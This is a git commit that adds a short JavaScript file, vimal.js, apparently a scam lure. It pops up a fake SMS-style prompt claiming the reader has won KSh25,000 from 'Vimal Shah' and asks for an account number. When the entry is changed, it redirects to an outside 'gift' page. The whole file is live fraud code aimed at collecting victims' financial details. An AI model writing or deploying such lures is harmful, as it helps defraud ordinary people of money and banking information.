e3650fd8c96a669caeda09dfca6734ec03e13e2f
The-On-going <sirpeelawson@gmail.com>
2026-05-20 22:29:33 +0100

    Create vimal.js

---
+++ vimal.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW KSh25,000'
+password=prompt('SMS: Congratulations, you are eligible to receive K25,000 From VIMAL SHAH, click OK to Enter Your Acc. Number','WITHDRAW KSh25,000');
+if (password != 'WITHDRAW KSh25,000') {
+location.href='https://ongoing-grant.info/Ksh25000-Vimal-Shah-Gift.html';
+}
